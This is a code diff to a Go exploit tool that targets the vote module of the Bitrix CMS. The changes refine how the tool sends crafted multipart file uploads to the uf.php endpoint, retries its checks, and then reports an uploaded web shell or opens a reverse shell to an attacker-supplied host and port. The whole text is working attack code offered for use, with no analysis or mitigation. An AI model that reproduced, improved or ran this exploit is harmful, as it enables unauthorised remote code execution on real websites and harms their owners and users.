@@ -16,24 +16,41 @@ const endpoint = "/bitrix/tools/vote/uf.php?attachId[ENTITY_TYPE]=CFileUploader&
 
 var counter int
 
-func Exploit(target, lhost, lport, agentId string, webshell bool) (string, string, error) {
+func Exploit(target, lhost, lport, agentId string, webshell bool) error {
+	if agentId == "1" {
+		agentId = "f"
+	}
+	if agentId == "2" {
+		agentId = "l"
+	}
+	if agentId == "3" {
+		agentId = "343"
+	}
 	if agentId == "4" {
 		agentId = "r"
+	}
+	if agentId == "5" {
+		agentId = "zxc"
+	}
+	if agentId == "6" {
+		agentId = "m"
 	}
 	if agentId == "7" {
 		agentId = "u"
 	}
-	if agentId == "2" {
-		agentId = "bitrix50"
+	if agentId == "8" {
+		agentId = "dfgdfg"
 	}
-
+	if agentId == "9" {
+		agentId = "x"
+	}
 	compositeData, cookie, err := tokens.Get(target)
 	if err != nil {
-		return "", "", err
+		return err
 	}
 	if compositeData == nil {
 		err = fmt.Errorf("Unable to access composite data.")
-		return "", "", err
+		return err
 	}
 
 	var success bool
@@ -147,7 +164,7 @@ Content-Disposition: form-data; name="bxu_info[filesCount]"
 
 1
 -----------------------------xxxxxxxxxxxx--
-			`, agentId, date.In(gmtTimeLoc).Format("01.02.2006 15:04:05"), agentId, bitrixSessid)
+			`, agentId, date.In(gmtTimeLoc).Format("02.01.2006 15:04:05"), agentId, bitrixSessid)
 		}
 		req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(bodyReq)))
 		req.Header.Set("Content-Type", "multipart/form-data; boundary=---------------------------xxxxxxxxxxxx")
@@ -155,13 +172,14 @@ Content-Disposition: form-data; name="bxu_info[filesCount]"
 
 		resp, err = client.Do(req)
 		if err != nil {
-			return "", "", err
+			return err
 		}
 		if resp.StatusCode == 200 {
 			body, _ := io.ReadAll(resp.Body)
 			if len(body) != 0 {
 				if strings.Contains(string(body), "Connector class should be instance of Bitrix\\\\Vote\\\\Attachment\\\\Connector") {
 					colors.BAD.Println("Vote agent module is not vulnerable.")
+					return nil
 				}
 			}
 		}
@@ -172,8 +190,8 @@ Content-Disposition: form-data; name="bxu_info[filesCount]"
 
 	success, err = checkUploadedFile(uploadedFile, randName, webshell)
 	if success == true && webshell == true {
-		fmt.Sprintf("The target's vote module is vulnerable! Web shell is uploaded, check %s", uploadedFile)
-		return "", "", nil
+		fmt.Printf("The target's vote module is vulnerable! Web shell is uploaded, check %s", uploadedFile)
+		return nil
 	}
 	if success == true && webshell == false {
 		colors.OK.Println("The target's vote module is vulnerable! Preparing reverse shell connection.")
@@ -182,22 +200,30 @@ Content-Disposition: form-data; name="bxu_info[filesCount]"
 		err := reverseShellPayload(target, lhost, lport, agentId)
 		time.Sleep(10 * time.Second)
 		if err != nil {
-			fmt.Sprintf("Unable to establish reverse shell connection: %s", err.Error())
+			fmt.Printf("Unable to establish reverse shell connection: %s", err.Error())
 		}
-	} else if counter <= 3 && webshell == false && !success {
-		colors.BAD.Printf("Failed, trying one more time... [%d/3]", counter)
-		time.Sleep(3 * time.Second)
-
-		success, err = checkUploadedFile(uploadedFile, randName, webshell)
-		if success == true && webshell == false {
-			colors.OK.Println("The target's vote module is vulnerable! Preparing reverse shell connection.")
-			err := reverseShellPayload(target, lhost, lport, agentId)
-			if err != nil {
-				fmt.Sprintf("Unable to establish reverse shell connection: %s", err.Error())
+	} else if !success {
+		for counter = 1; counter <= 3; counter++ {
+			colors.BAD.Printf("Failed, trying one more time... [%d/3]\n", counter)
+			time.Sleep(3 * time.Second)
+			success, err = checkUploadedFile(uploadedFile, randName, webshell)
+			if success && webshell == true {
+				fmt.Printf("The target's vote module is vulnerable! Web shell is uploaded, check %s", uploadedFile)
+				return nil
+			} else if success && webshell == false {
+				colors.OK.Println("The target's vote module is vulnerable! Preparing reverse shell connection.")
+				err := reverseShellPayload(target, lhost, lport, agentId)
+				if err != nil {
+					fmt.Printf("Unable to establish reverse shell connection: %s", err.Error())
+				}
+				return nil
+			} else {
+				continue
 			}
 		}
+		colors.BAD.Println("The target's vote agent might be dead, try another vote agent's ID!")
 	}
-	return uploadedFile, randName, nil
+	return nil
 }
 func checkUploadedFile(uploadedFile string, randName string, webshell bool) (bool, error) {
 	var bodyReq string
@@ -210,7 +236,6 @@ func checkUploadedFile(uploadedFile string, randName string, webshell bool) (boo
 		return false, err
 	}
 
-	counter++
 	if resp.StatusCode == 200 {
 		body, _ := io.ReadAll(resp.Body)
 		if webshell == true {
@@ -317,7 +342,7 @@ Content-Disposition: form-data; name="bxu_info[filesCount]"
 
 1
 -----------------------------xxxxxxxxxxxx--
-			`, agentId, date.In(gmtTimeLoc).Format("01.02.2006 15:04:05"), agentId, bitrixSessid)
+			`, agentId, date.In(gmtTimeLoc).Format("02.01.2006 15:04:05"), agentId, bitrixSessid)
 		}
 		req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(bodyReq)))
 		req.Header.Set("Content-Type", "multipart/form-data; boundary=---------------------------xxxxxxxxxxxx")
